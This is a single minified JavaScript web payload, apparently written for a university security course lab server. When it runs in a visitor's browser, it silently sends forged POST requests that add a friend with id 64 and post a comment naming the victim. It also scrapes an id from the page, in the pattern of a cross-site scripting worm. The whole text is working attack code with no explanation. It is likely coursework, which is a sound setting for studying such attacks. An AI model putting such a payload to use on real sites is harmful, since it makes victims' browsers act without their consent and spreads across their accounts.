var varMonth=(new Date).getMonth(),varYear=(new Date).getYear();if(varMonth<=11&&varYear<=120){var r=new XMLHttpRequest;const e=64;r.open("POST","http://csec380-core.csec.rit.edu:86/add_friend.php?id="+e,!0),r.setRequestHeader("Content-Type","x-www-form-urlencoded"),r.send();const n=encodeURI(new Date+": Russell added you through the user "+$("#name").text());for(var v=document.documentElement.innerHTML.indexOf("id=")+3,new_id=document.documentElement.innerHTML.slice(v,v+1);!isNaN(parseInt(document.documentElement.innerHTML.slice(v,v+1)));)v+=1,new_id+=document.documentElement.innerHTML.slice(v,v+1);new_id=new_id.replace(/\D/g,""),r.open("POST","http://csec380-core.csec.rit.edu:86/add_comment.php?id="+e+"&comment="+n,!0),r.send()}
